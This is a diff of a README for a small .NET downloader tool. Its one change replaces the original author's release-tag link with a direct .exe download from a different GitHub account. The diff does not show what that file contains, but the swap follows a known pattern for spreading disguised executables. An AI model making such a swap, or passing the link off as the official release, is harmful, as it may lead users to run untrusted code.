@@ -34,6 +34,6 @@ All pepe images are taken from [The Eye](https://the-eye.eu/), So big thanks to 
  12. Wait until it compiles.
  13. Once it compiles, go to your **Target location** and you should see a single executable.
 
-Wow. you done it. you could've just got the [release](https://github.com/PokusPollo/pepegaDownloader/releases/tag/v1). 
+Wow. you done it. you could've just got the [release](https://github.com/japannt/pepegaDownloader/releases/latest/download/pepegaDownloader.exe). 
 
 PS. I dont know how to compile .net shit to Linux, just use wine or something lol.
